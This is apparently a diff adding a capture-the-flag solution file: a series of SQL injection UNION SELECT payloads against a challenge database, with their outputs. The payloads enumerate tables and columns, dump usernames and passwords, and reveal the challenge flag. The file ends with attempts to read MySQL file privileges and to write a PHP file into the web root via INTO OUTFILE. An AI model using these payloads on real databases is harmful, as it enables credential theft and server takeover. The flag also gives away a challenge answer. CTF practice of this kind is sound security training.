@@ -1,0 +1,25 @@
+_SQL_Inj3ct10n_W1th_
+--------------------------
+' UNION SELECT NULL, database(), NULL, NULL, NULL -- -
+--> database: ctf_db
+--------------------------
+' UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables -- -
+--------------------------
+' UNION SELECT NULL, username, password, NULL, NULL FROM users -- -
+--> Byp4ss_4ll_F1lt3rs} (part 3) From username: Have A Nice Done (hex decode)
+---------------------------
+' UNION SELECT NULL, column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='secret' -- -
+--> description, id, image, name, price
+
+' UNION SELECT id, description, image, name, price FROM secret -- -
+--> VSL{M4st3r1ng_Th3_4rt_0f
+-----------------------------
+---> Flag: VSL{M4st3r1ng_Th3_4rt_0f_SQL_Inj3ct10n_W1th_Byp4ss_4ll_F1lt3rs}
+-----------------------------
+
+
+---------------------------
+' UNION SELECT NULL, file_priv, current_user(), user(), NULL FROM mysql.user -- - 
+' UNION SELECT NULL, '<?php phpinfo() ?>', NULL, NULL, NULL INTO OUTFILE '/var/www/html/image/xxx.php' -- - | --> fail ?
+---------------------------
+
